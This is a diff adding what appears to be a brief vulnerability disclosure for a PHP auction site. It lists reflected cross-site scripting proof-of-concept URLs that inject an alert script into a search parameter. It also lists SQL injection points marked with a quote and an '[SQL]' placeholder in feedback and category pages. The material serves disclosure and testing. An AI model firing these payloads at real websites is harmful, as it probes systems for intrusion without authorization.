@@ -1,0 +1,14 @@
+Cross Site Scripting (XSS)
+--------------------------
+http://www.example.com/auctionsearch.php?advsrc=&quot;&lt;script&gt;alert(/EllipsisSecurityTe
+st/)&lt;/script&gt;
+http://www.example.com/auctionsearch.php?start=1&amp;advsrc=&quot;&gt;&lt;script&gt;alert(/EllipsisS
+ecurityTest/)&lt;/script&gt;
+-------------
+SQL injection
+-------------
+http://www.example.com/viewfeedback.php?view=1&#039;[SQL]
+http://www.example.com/viewfeedback.php?view=all&amp;start=1&#039;[SQL]
+http://www.example.com/categories.php?parent=&amp;start=&amp;orderField=itemname&amp;orderType
+=1&#039;[SQL]
+-----------------
